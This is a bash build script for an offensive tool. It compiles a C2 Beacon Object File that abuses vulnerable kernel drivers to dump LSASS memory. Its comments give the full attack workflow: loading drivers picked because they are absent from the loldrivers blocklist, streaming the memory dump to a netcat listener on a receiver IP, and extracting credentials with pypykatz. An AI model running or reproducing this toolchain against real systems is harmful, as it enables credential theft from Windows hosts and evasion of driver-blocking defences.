#!/usr/bin/env bash
# build_bof.sh - Cross-compile byovd_dump_bof.c to COFF .o on macOS/Linux
# Output: build/Release/byovd_dump_bof.o
#
# Requires: x86_64-w64-mingw32-gcc (Homebrew: brew install mingw-w64)
#
# Usage:
#   bash tools/build_bof.sh
#
# Then in Kassandra Mythic UI:
#   executeBOF -> file_id: byovd_dump_bof.o
#   parameters: bin:<base64_driver.sys> str:<receiver_ip> int:<port> int:<driver_type>
#
#   driver_type: 0 = BiosToolCommonDriver
#                1 = RtsPpx (Realtek, novel - NOT on loldrivers)
#                2 = RwDrv  (RWEverything, novel hash - NOT on loldrivers)
#
# On receiver (before running BOF):
#   nc -lvp 9999 > lsass_raw.bin
#
# Post-processing on analyst box:
#   python3 tools/rpm2minidump.py lsass_raw.bin lsass.dmp
#   pypykatz lsa minidump lsass.dmp

set -e

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SRC="$REPO_ROOT/src/byovd_dump_bof.c"
OUT_DIR="$REPO_ROOT/build/Release"
OUT="$OUT_DIR/byovd_dump_bof.o"

mkdir -p "$OUT_DIR"

# Check for MinGW cross-compiler
CC="x86_64-w64-mingw32-gcc"
if ! command -v "$CC" >/dev/null 2>&1; then
    echo "[-] $CC not found. Install with: brew install mingw-w64"
    exit 1
fi

echo "[*] Compiling $SRC -> $OUT"
$CC -c "$SRC" -o "$OUT" \
    -DBOF \
    -Os \
    -w \
    -mno-stack-arg-probe \
    -fno-builtin

echo "[+] Done: $OUT ($(wc -c < "$OUT") bytes)"
echo ""
echo "[*] Encode driver for BOF argument:"
echo "    base64 -i <driver>.sys | tr -d '\\n'"
echo ""
echo "[*] Run in Kassandra executeBOF:"
echo "    file_id: byovd_dump_bof.o"
echo "    parameters: bin:<base64_driver> str:<receiver_ip> int:<port> int:<driver_type>"
echo ""
echo "    driver_type: 0=BiosTool  1=RtsPpx  2=RwDrv"
